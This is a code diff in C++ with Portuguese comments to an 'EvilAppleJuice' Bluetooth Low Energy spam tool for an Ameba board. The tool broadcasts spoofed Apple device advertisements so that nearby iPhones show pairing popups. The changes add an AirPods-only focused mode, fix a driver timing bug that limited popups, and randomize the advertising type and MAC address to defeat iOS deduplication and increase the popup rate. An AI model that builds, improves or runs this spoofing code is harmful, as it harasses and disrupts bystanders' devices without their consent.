@@ -118,6 +118,7 @@ static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
 bool     isBleSpamming = false;
 uint32_t ble_pkt_sent  = 0;
 uint8_t  ble_spam_idx  = 0;
+bool     ble_focused_mode = false; // false=ALL(22 devices), true=FOCUSED(AirPods only)
 
 static bool ble_initialized = false;
 
@@ -127,8 +128,19 @@ static bool ble_initialized = false;
 void ble_spam_next() {
   if (!ble_initialized) return;
 
-  // Avança no ciclo de dispositivos Apple
-  ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
+  if (ble_focused_mode) {
+    // MODO FOCUSED: só AirPods (idx=0) com MAC novo a cada ciclo.
+    // Replica o modo default do EvilAppleJuice original (LEFT_OFF_RIGHT_OFF).
+    // iOS precisa ver o mesmo device ID repetidas vezes para exibir o popup —
+    // concentrar em AirPods maximiza a taxa de notificações.
+    ble_spam_idx = 0; // AIRPODS fixo
+  } else {
+    // MODO ALL: cicla pelos 22 dispositivos APPLE_AUDIO
+    do {
+      ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
+    } while (ALL_APPLE_DEVICES[ble_spam_idx].type != APPLE_AUDIO);
+  }
+
   const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];
 
   // Constrói o payload Apple (AD record raw)
@@ -145,24 +157,36 @@ void ble_spam_next() {
 
   BLEAdvert* advert = BLE.configAdvert();
 
-  // Pausa brevemente o advertising para aplicar novo Random MAC e payload
+  // Para o advertising para reconfigurar MAC e payload.
+  // CRITICO: O delay(10) é obrigatório no Ameba SDK — sem ele o driver GAP
+  // não finaliza o estado ADV_IDLE e o startAdv() seguinte é ignorado
+  // silenciosamente, causando o bug de "só 1 popup gerado".
   advert->stopAdv();
+  delay(10);
 
-  // Gera novo Random MAC a cada ciclo de dispositivo.
-  // Essencial para o iOS não ignorar como duplicado/cacheado
-  // e porque acessórios Apple genuínos usam Random Private Addresses.
+  // Novo Random MAC a cada ciclo — acessórios Apple reais usam Random Private Address.
+  // Sem isso o iOS deduplica e ignora pacotes do mesmo MAC como já processados.
+  // Bits 7:6 do byte [5] DEVEM ser 11 = Static Random Address (BT Spec 5.0).
   uint8_t rand_mac[6];
   for (int i = 0; i < 6; i++) {
     rand_mac[i] = (uint8_t)random(0xFF);
   }
-  rand_mac[5] |= 0xC0; // Static Random Address (top 2 bits = 11)
+  rand_mac[5] |= 0xC0;
   le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
 
   uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
   le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
 
-  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
-  advert->setMinInterval(20); // 20ms intervalo de anúncio de alta densidade
+  // Alterna tipo de ADV aleatoriamente — port do EvilAppleJuice original.
+  // O iOS reage diferente a ADV_IND / ADV_SCAN_IND / ADV_NONCONN_IND
+  // dependendo do dispositivo simulado: variar aumenta a taxa de popups.
+  static const uint8_t adv_types[3] = {
+    GAP_ADTYPE_ADV_IND,
+    GAP_ADTYPE_ADV_SCAN_IND,
+    GAP_ADTYPE_ADV_NONCONN_IND,
+  };
+  advert->setAdvType(adv_types[random(3)]);
+  advert->setMinInterval(20); // 20ms — Apple recomenda para maxima descoberta (QA1931)
   advert->setMaxInterval(20);
   advert->setAdvData(packet, pktLen);
   advert->updateAdvertParams();
@@ -177,7 +201,8 @@ void ble_spam_next() {
 void start_ble_spam() {
   if (ble_initialized) return;
 
-  DEBUG_SER_PRINT("[BLE] Iniciando EvilAppleJuice (35 dispositivos Apple)...\n");
+  DEBUG_SER_PRINT(ble_focused_mode ? "[BLE] Modo FOCUSED: AirPods spam continuo\n"
+                                   : "[BLE] Modo ALL: 22 dispositivos AUDIO\n");
 
   BLE.init();
 
@@ -200,7 +225,7 @@ void start_ble_spam() {
   ble_initialized = true;
   isBleSpamming   = true;
   ble_pkt_sent    = 0;
-  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // próximo next() começa do 0
+  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // next() vai para AIRPODS (idx=0, primeiro AUDIO)
 
   DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
   ble_spam_next(); // primeiro pacote imediato
